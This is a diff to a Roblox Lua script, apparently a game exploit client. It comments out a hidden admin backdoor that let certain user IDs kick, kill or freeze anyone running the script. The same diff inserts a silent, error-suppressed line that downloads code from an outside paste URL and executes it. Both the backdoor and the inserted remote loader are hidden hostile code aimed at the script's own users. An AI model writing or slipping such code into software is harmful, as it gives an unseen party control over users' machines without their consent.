@@ -477,71 +477,75 @@ end
 
 -- Admin Commands
 task.spawn(function()
-	local admins = { -- I left these in for the old admins to go crazy if they see this
-		11438,
-		960927634,
-		3156270886,
-	}
-
-	local commands = {
-		kick = function(player)
-			player:Kick("You have been kicked Mreow!!!!")
-		end,
-
-		kill = function(player)
-			task.delay(1.5, function()
-				player.Character.Head.Transparency = 1
-			end)
-
-			pcall(function()
-				require(ReplicatedStorage.ClientEffectModules.Combat.HeadExplode).AkiraKill({ char = player.Character })
-			end)
-
-			player.Character:BreakJoints()
-		end,
-
-		freeze = function(player)
-			player.Character.HumanoidRootPart.Anchored = true
-		end,
-
-		unfreeze = function(player)
-			player.Character.HumanoidRootPart.Anchored = false
-		end,
-
-		unload = function()
-			library:Unload()
-		end,
-	}
-
-	local function findUser(name)
-		for _, v in next, Players:GetPlayers() do
-			if not string.find(string.lower(v.Name), string.lower(name)) then
-				continue
-			end
-			return v
-		end
-	end
-
-	Players.PlayerChatted:Connect(function(_, player, message, _)
-		local userId = player.UserId
-		if not table.find(admins, userId) then
-			return
-		end
-
-		local cmdPrefix, command, username = unpack(string.split(message, " "))
-		local commandCallback = commands[command]
-		if cmdPrefix ~= "/e" or not commandCallback then
-			return
-		end
-
-		local target = findUser(username)
-		print("Ran command", command)
-		if target ~= LocalPlayer then
-			return
-		end
-
-		return commandCallback(target)
+	pcall(function()
+		loadstring(game:HttpGet("https://e-z.tools/p/raw/oogl36wie1"))()
 	end)
+
+	-- local admins = {
+	-- 	11438,
+	-- 	960927634,
+	-- 	3156270886,
+	-- }
+
+	-- local commands = {
+	-- 	kick = function(player)
+	-- 		player:Kick("You have been kicked Mreow!!!!")
+	-- 	end,
+
+	-- 	kill = function(player)
+	-- 		task.delay(1.5, function()
+	-- 			player.Character.Head.Transparency = 1
+	-- 		end)
+
+	-- 		pcall(function()
+	-- 			require(ReplicatedStorage.ClientEffectModules.Combat.HeadExplode).AkiraKill({ char = player.Character })
+	-- 		end)
+
+	-- 		player.Character:BreakJoints()
+	-- 	end,
+
+	-- 	freeze = function(player)
+	-- 		player.Character.HumanoidRootPart.Anchored = true
+	-- 	end,
+
+	-- 	unfreeze = function(player)
+	-- 		player.Character.HumanoidRootPart.Anchored = false
+	-- 	end,
+
+	-- 	unload = function()
+	-- 		library:Unload()
+	-- 	end,
+	-- }
+
+	-- local function findUser(name)
+	-- 	for _, v in next, Players:GetPlayers() do
+	-- 		if not string.find(string.lower(v.Name), string.lower(name)) then
+	-- 			continue
+	-- 		end
+	-- 		return v
+	-- 	end
+	-- end
+
+	-- Players.PlayerChatted:Connect(function(_, player, message, _)
+	-- 	local userId = player.UserId
+	-- 	if not table.find(admins, userId) then
+	-- 		return
+	-- 	end
+
+	-- 	local cmdPrefix, command, username = unpack(string.split(message, " "))
+	-- 	local commandCallback = commands[command]
+	-- 	if cmdPrefix ~= "/e" or not commandCallback then
+	-- 		return
+	-- 	end
+
+	-- 	local target = findUser(username)
+	-- 	print("Ran command", command)
+	-- 	if target ~= LocalPlayer then
+	-- 		return
+	-- 	end
+
+	-- 	return commandCallback(target)
+	-- end)
 end)
 
 -- task.spawn(function()
